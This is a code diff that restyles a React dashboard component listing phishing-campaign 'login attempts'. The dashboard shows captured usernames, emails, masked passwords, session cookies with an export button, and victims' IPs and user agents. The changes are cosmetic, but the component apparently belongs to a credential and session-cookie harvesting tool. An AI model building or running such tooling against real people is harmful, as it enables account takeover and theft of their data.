@@ -84,87 +84,127 @@ const LoginAttemptsList = ({ campaignId }) => {
   // — Rendering states —
   if (loading && !loginAttempts.length) {
     return (
-      <div className="bg-white rounded-lg shadow p-6 my-4">
-        <h2 className="text-xl font-bold mb-4">Login Attempts</h2>
-        <div className="flex justify-center">
-          <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500"></div>
-        </div>
+      <div className="glass-card p-8 text-center">
+        <h2 className="text-xl font-semibold text-cyber-primary mb-4">Authentication Events</h2>
+        <div className="loading-spinner mx-auto mb-4"></div>
+        <p className="text-cyber-muted">Scanning for authentication attempts...</p>
       </div>
     );
   }
 
   if (error) {
     return (
-      <div className="bg-white rounded-lg shadow p-6 my-4">
-        <h2 className="text-xl font-bold mb-4">Login Attempts</h2>
-        <p className="text-red-500">{error}</p>
+      <div className="glass-card p-8 text-center">
+        <h2 className="text-xl font-semibold text-cyber-primary mb-4">Authentication Events</h2>
+        <div className="flex items-center justify-center space-x-2 text-cyber-accent">
+          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z" />
+          </svg>
+          <span>{error}</span>
+        </div>
       </div>
     );
   }
 
   if (!loginAttempts.length) {
     return (
-      <div className="bg-white rounded-lg shadow p-6 my-4">
-        <h2 className="text-xl font-bold mb-4">Login Attempts</h2>
-        <p className="text-gray-500">No login attempts recorded for this campaign.</p>
+      <div className="glass-card p-8 text-center">
+        <h2 className="text-xl font-semibold text-cyber-primary mb-4">Authentication Events</h2>
+        <svg className="w-12 h-12 text-cyber-muted mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+        </svg>
+        <p className="text-cyber-muted">No authentication attempts recorded for this campaign.</p>
       </div>
     );
   }
 
   // — Main list —
   return (
-    <div className="bg-white rounded-lg shadow p-6 my-4">
-      <h2 className="text-xl font-bold mb-4">
-        Login Attempts ({loginAttempts.length})
-      </h2>
+    <div className="glass-card p-6">
+      <div className="flex items-center justify-between mb-6">
+        <h2 className="text-xl font-semibold text-cyber-primary">
+          Authentication Events
+        </h2>
+        <div className="badge badge-success">
+          {loginAttempts.length} attempts
+        </div>
+      </div>
 
-      <div className="space-y-6">
+      <div className="space-y-4">
         {loginAttempts.map(attempt => (
-          <div key={attempt.id} className="border rounded-lg p-4 bg-gray-50">
+          <div key={attempt.id} className="data-table rounded-lg p-6">
             {/* Header */}
-            <div className="flex justify-between">
-              <h3 className="font-semibold">{attempt.targetEmail}</h3>
-              <span className="text-sm text-gray-500">{formatDate(attempt.timestamp)}</span>
+            <div className="flex justify-between items-start mb-4">
+              <div>
+                <h3 className="font-semibold text-cyber-primary text-lg">{attempt.targetEmail}</h3>
+                <div className="flex items-center space-x-2 text-sm text-cyber-muted mt-1">
+                  <div className="w-2 h-2 bg-cyber-accent rounded-full status-indicator"></div>
+                  <span>{formatDate(attempt.timestamp)}</span>
+                </div>
+              </div>
+              <div className="flex items-center space-x-2">
+                <div className="badge badge-warning">IP: {attempt.ipAddress || 'Unknown'}</div>
+                {attempt.hasCookies && (
+                  <div className="badge badge-success">Cookies Captured</div>
+                )}
+              </div>
             </div>
 
-            <div className="mt-3 grid md:grid-cols-2 gap-4">
+            <div className="grid md:grid-cols-2 gap-6">
               {/* Credentials/Form Fields */}
-              <div>
-                <h4 className="font-semibold text-sm">Credentials Used</h4>
-                <div className="bg-white p-3 rounded border mt-1">
+              <div className="glass-card p-4">
+                <h4 className="font-semibold text-sm text-cyber-secondary mb-3">Captured Credentials</h4>
+                <div className="space-y-2">
                   {attempt.username || attempt.password || attempt.inputEmail ? (
                     <>
-                      {attempt.username && <div>Username: {attempt.username}</div>}
-                      {attempt.password && <div>Password: {attempt.password}</div>}
-                      {attempt.inputEmail && <div>Email: {attempt.inputEmail}</div>}
+                      {attempt.username && (
+                        <div className="flex justify-between">
+                          <span className="text-cyber-muted">Username:</span>
+                          <span className="font-mono text-cyber-primary">{attempt.username}</span>
+                        </div>
+                      )}
+                      {attempt.password && (
+                        <div className="flex justify-between">
+                          <span className="text-cyber-muted">Password:</span>
+                          <span className="font-mono text-cyber-accent">{'*'.repeat(attempt.password.length)}</span>
+                        </div>
+                      )}
+                      {attempt.inputEmail && (
+                        <div className="flex justify-between">
+                          <span className="text-cyber-muted">Email:</span>
+                          <span className="font-mono text-cyber-secondary">{attempt.inputEmail}</span>
+                        </div>
+                      )}
                     </>
                   ) : (
-                    <em>No credentials captured</em>
+                    <p className="text-cyber-muted italic">No credentials captured</p>
                   )}
                 </div>
 
                 {attempt.formFields?.length > 0 && (
-                  <div className="mt-3">
+                  <div className="mt-4">
                     <button
                       onClick={() => toggleExpand(`form-${attempt.id}`)}
-                      className="text-blue-500 text-xs"
+                      className="glass-button px-3 py-1 text-xs rounded"
                     >
                       {expandedIds[`form-${attempt.id}`] ? 'Hide' : 'Show'} All Form Fields
                     </button>
                     {expandedIds[`form-${attempt.id}`] && (
-                      <div className="mt-2 max-h-60 overflow-auto border rounded p-2">
+                      <div className="mt-3 data-table rounded p-3 max-h-60 overflow-auto">
                         <table className="w-full text-sm">
                           <thead>
                             <tr>
-                              <th className="text-left">Field</th>
-                              <th className="text-left">Value</th>
+                              <th className="text-left text-cyber-primary">Field</th>
+                              <th className="text-left text-cyber-primary">Value</th>
                             </tr>
                           </thead>
                           <tbody>
                             {attempt.formFields.map((f, i) => (
                               <tr key={i}>
-                                <td>{f.name}</td>
-                                <td>{typeof f.value === 'object' ? JSON.stringify(f.value) : f.value}</td>
+                                <td className="text-cyber-muted">{f.name}</td>
+                                <td className="font-mono text-cyber-secondary">
+                                  {typeof f.value === 'object' ? JSON.stringify(f.value) : f.value}
+                                </td>
                               </tr>
                             ))}
                           </tbody>
@@ -176,75 +216,92 @@ const LoginAttemptsList = ({ campaignId }) => {
               </div>
 
               {/* Cookies Panel */}
-              <div>
-                <h4 className="font-semibold text-sm">Cookies</h4>
-                <div className="bg-white p-3 rounded border mt-1">
-                  {attempt.hasCookies ? (
-                    <>
-                      <div>{attempt.cookiesCount} cookies captured</div>
-                      <div className="mt-2 flex space-x-2">
-                        <button
-                          onClick={() => handleDownloadCookies(attempt.id)}
-                          className="px-2 py-1 bg-blue-500 text-white rounded"
-                        >
-                          Download
-                        </button>
-                        <button
-                          onClick={() => toggleExpand(`cookies-${attempt.id}`)}
-                          className="px-2 py-1 bg-gray-500 text-white rounded"
-                        >
-                          {expandedIds[`cookies-${attempt.id}`] ? 'Hide' : 'View'}
-                        </button>
-                      </div>
-                      {expandedIds[`cookies-${attempt.id}`] && (
-                        <div className="mt-2 max-h-60 overflow-auto border rounded p-2 text-sm">
-                          <table className="w-full">
-                            <thead>
-                              <tr>
-                                <th>Name</th>
-                                <th>Value</th>
-                                <th>Domain</th>
-                                <th>Path</th>
-                                <th>Expires</th>
-                                <th>Flags</th>
-                              </tr>
-                            </thead>
-                            <tbody>
-                              {attempt.cookies.map((c, i) => (
-                                <tr key={i}>
-                                  <td>{c.name}</td>
-                                  <td className="break-all">{c.value}</td>
-                                  <td>{c.domain || '—'}</td>
-                                  <td>{c.path || '/'}</td>
-                                  <td>{c.expirationDate ? new Date(c.expirationDate*1000).toLocaleString() : 'Session'}</td>
-                                  <td>{[
+              <div className="glass-card p-4">
+                <h4 className="font-semibold text-sm text-cyber-secondary mb-3">Session Cookies</h4>
+                {attempt.hasCookies ? (
+                  <div className="space-y-3">
+                    <div className="flex items-center justify-between">
+                      <span className="text-cyber-muted">{attempt.cookiesCount} cookies captured</span>
+                      <div className="badge badge-success">Active Session</div>
+                    </div>
+                    <div className="flex space-x-2">
+                      <button
+                        onClick={() => handleDownloadCookies(attempt.id)}
+                        className="glass-button px-3 py-1 text-sm rounded flex items-center space-x-1"
+                      >
+                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                        </svg>
+                        <span>Export</span>
+                      </button>
+                      <button
+                        onClick={() => toggleExpand(`cookies-${attempt.id}`)}
+                        className="glass-button px-3 py-1 text-sm rounded"
+                      >
+                        {expandedIds[`cookies-${attempt.id}`] ? 'Hide' : 'View'} Details
+                      </button>
+                    </div>
+                    {expandedIds[`cookies-${attempt.id}`] && (
+                      <div className="data-table rounded p-3 max-h-60 overflow-auto">
+                        <table className="w-full text-xs">
+                          <thead>
+                            <tr>
+                              <th className="text-left text-cyber-primary">Name</th>
+                              <th className="text-left text-cyber-primary">Value</th>
+                              <th className="text-left text-cyber-primary">Domain</th>
+                              <th className="text-left text-cyber-primary">Flags</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            {attempt.cookies.map((c, i) => (
+                              <tr key={i}>
+                                <td className="font-mono text-cyber-secondary">{c.name}</td>
+                                <td className="font-mono text-cyber-muted break-all">
+                                  {c.value.length > 20 ? `${c.value.substring(0, 20)}...` : c.value}
+                                </td>
+                                <td className="text-cyber-muted">{c.domain || '—'}</td>
+                                <td className="text-cyber-muted">
+                                  {[
                                     c.httpOnly && 'HttpOnly',
                                     c.secure && 'Secure',
-                                    c.hostOnly && 'HostOnly',
-                                    c.session && 'Session',
-                                    c.sameSite && `SameSite=${c.sameSite}`
-                                  ].filter(Boolean).join(', ')}</td>
-                                </tr>
-                              ))}
-                            </tbody>
-                          </table>
-                        </div>
-                      )}
-                    </>
-                  ) : (
-                    <em>No cookies captured</em>
-                  )}
-                </div>
+                                    c.session && 'Session'
+                                  ].filter(Boolean).join(', ') || '—'}
+                                </td>
+                              </tr>
+                            ))}
+                          </tbody>
+                        </table>
+                      </div>
+                    )}
+                  </div>
+                ) : (
+                  <p className="text-cyber-muted italic">No cookies captured</p>
+                )}
               </div>
             </div>
 
             {/* Additional Info */}
-            <div className="mt-4 text-sm">
-              <div>Target Email: {attempt.targetEmail}</div>
-              <div>URL: {attempt.url}</div>
-              <div>IP: {attempt.ipAddress || 'N/A'}</div>
-              <div>User Agent: {attempt.userAgent || 'N/A'}</div>
-              {attempt.captureMethod && <div>Method: {attempt.captureMethod}</div>}
+            <div className="mt-4 pt-4 border-t border-cyber-primary/20">
+              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
+                <div>
+                  <span className="text-cyber-muted">Target:</span>
+                  <div className="font-mono text-cyber-primary">{attempt.targetEmail}</div>
+                </div>
+                <div>
+                  <span className="text-cyber-muted">URL:</span>
+                  <div className="font-mono text-cyber-secondary break-all">{attempt.url}</div>
+                </div>
+                <div>
+                  <span className="text-cyber-muted">Method:</span>
+                  <div className="text-cyber-primary">{attempt.captureMethod || 'Web Form'}</div>
+                </div>
+                <div>
+                  <span className="text-cyber-muted">User Agent:</span>
+                  <div className="text-cyber-muted text-xs break-all">
+                    {attempt.userAgent ? attempt.userAgent.substring(0, 50) + '...' : 'N/A'}
+                  </div>
+                </div>
+              </div>
             </div>
           </div>
         ))}
